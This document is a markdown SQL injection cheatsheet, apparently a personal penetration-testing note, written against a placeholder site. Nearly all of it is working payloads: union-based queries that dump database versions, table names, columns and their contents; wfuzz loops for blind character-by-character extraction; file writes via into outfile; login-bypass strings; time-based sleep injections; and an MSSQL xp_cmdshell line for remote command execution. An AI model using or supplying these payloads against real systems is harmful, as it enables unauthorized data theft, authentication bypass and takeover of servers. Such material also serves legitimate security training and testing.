# SQL Injection Cheatsheet

This cheatsheet should NOT be conbsiderd as reference but guide to built on, some of the examples below will require modification(s) such as url encode, comments, etc. Before we contiune here is couple good to know SQL functions

```php
limit <row offset>,<number of rows>                          # display rows based on offset and number

count(*)                                                     # display number of rows

rand()                                                       # generate random number between 0 and 1

floor(rand()*<number>)                                       # print out number part of random decimal number

select(select database());                                   # double query (nested) using database() as an example

group by <column name>                                       # summerize rows based on column name

concat(<string1>, <string2>, ..)                             # concatenate strings such as tables, column names

length(<string>)                                             # calculate the number of characters for given string

substr(<string>,<offset>,<characters length>)                # print string character(s) by providing offset and length

ascii(<character>)                                           # decimal representation of the character

sleep(<number of seconds>)                                   # go to sleep for <number of seconds>

if(<condition>,<true action>,<false action>)                 # conditional if statement

like "<string>%"                                             # checks if provided string present

outfile "<url to file>"                                      # dump output of select statement into a file

load_file("<url to file>")                                   # dump the content of file
```
Now comes the fun part, here's combination of error, union, blind SQL command injection examples.

Determine back-end query number of columns with error-based string SQL command injection
```php
http://meh.com/index.php?id=1 order by <number>
```

Determine back-end query number of columns by observing `http response size` with `wfuzz` in error-based integer SQL command injection
```php
wfuzz -c -z range,1-10 "http://meh.com/index.php?id=1 order by FUZZ"
```

Identify webpage printable union columns by providing false value to back-end query with error-based integer SQL command injection. This injection depends on number of columns identified by `order by` clause
```php
http://meh.com/index.php?id=-1 union select <number of columns seperated by comma>
```

Dump the content of table into the filesystem
```php
http://meh.com/index.php?id=-1')) union select <column1>,<column2> from <table name> into outfile "<url to file>" --+
```

Print back-end SQL version with error-based integer SQL command injection, assuming column 3 content gets diplayed on webpage
```php
http://meh.com/index.php?id=-1 union select 1,2,@@version,4,...
```

Print user running the query to access back-end database server with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,user(),4,...
```

Print database name with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,database(),4,...
```

Print database directory with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,@@datadir,4,...
```

Print table names with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,group_concat(table_name),4,... from information_schema.tables where table_schema=database()
```

Print column names with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,group_concat(column_name),4,... from information_schema.columns where table_name='<table name>'
```

Print content of column with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,group_concat(<column name>),4,... from <table name>
```

Use `and` statement as substitute to reqular comments such as `--+`, `#`, and `/* */` with error-based string SQL command injection
```php
http://meh.com/index.php?id=1' <sqli here> and '1
```
Determine databsae name with boolean-based blind SQL injection with `substr()`
```php
http://meh.com/index.php?id=1' and (substr(database(),<offset>,<character length>))='<character>' --+
```

Determine databsae name with boolean-based blind SQL injection by observing `http response size` with combination of `substr()` and `wfuzz`, assuming database name does not include special characters
```php
for i in $(seq 1 10); do wfuzz -c -z list,a-b-c-d-e-f-g-h-i-j-k-l-m-n-o-p-q-r-s-t-u-v-w-x-y-z --hw=<word count> "http://meh.com/index.php?id=1' and (substr(database(),$i,1))='FUZZ' --+";done
```
Determine databsae name with boolean-based blind SQL injection by observing `http response size` with `substr()`, `ascii()` and `wfuzz`. The below range is the standard ASCII characters (32-127)
```php
for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr(database(),$i,1)))=FUZZ --+";done
```

Determine table name with boolean-based blind SQL injection by observing `http response size` with `substr()`, `ascii()`, and `wfuzz`.The below range is the standard ASCII characters (32-127)
```php
for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),$i,1)))=FUZZ --+";done # increment limit first argument by 1 to get the next available table name
```

Determine column name with boolean blind-based SQL injection by observing `http response size` with `substr()`, `ascii()`, and `wfuzz`. The below range is the standard ASCII characters (32-127)
```php
for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name=<table name> limit 0,1),$i,1)))=FUZZ --+";done # increment limit first argument by 1 to get the next available column name
```

Hope those were helpfull! Now here's couple login bypass commands that worked for me
```php
meh' OR 3=3;#
meh' OR 2=2 LIMIT 1;#
meh' OR 'a'='a
meh' OR 1=1 --+
```
Sometimes you'll run into Microsoft SQL server that have `xp_cmdshell` turned on, here's syntax for remote code execution
```php
meh' exec master..xp_cmdshell '<command here>' --
```

Final notes!
- If you made it this far then you know that most of the SQL command injection examples are based on `MySQL` and I don't plan on making any for `MSSQL` cause I'm lazy
- Use your proxy of choice to bypass client-side javascript restrictions
- `order by` clause works only with regular comments such as `--+`
- Update ASCII range to include special characters if you're going after users table
- `MySQL` don't have permissions to overwrite an exsisting file, make sure you go with new filename every single time with `outfile`.
- Make sure the vulnerable paramater have false value when working with union-based SQL command injection
- It's worth noting that all of the examples in this cheatsheet where http `GET` requests, and it shouldn't be that hard to replicate them with http `POST`requests once you grasp the core concepts.
- You need to input true value to the vulnerable paramter for `and sleep()` to work, otherwise go with `or sleep()`. Here's an example for the sake of clarification
```php
http://meh.com/index.php?id=<true value>' and sleep(1) #
http://meh.com/index.php?id=<false value>' or sleep(1) #
```
To do list
- Python or bash script to convert ascii to text after data extraction (grep output in this case)
- Create outfile && loadfile templates
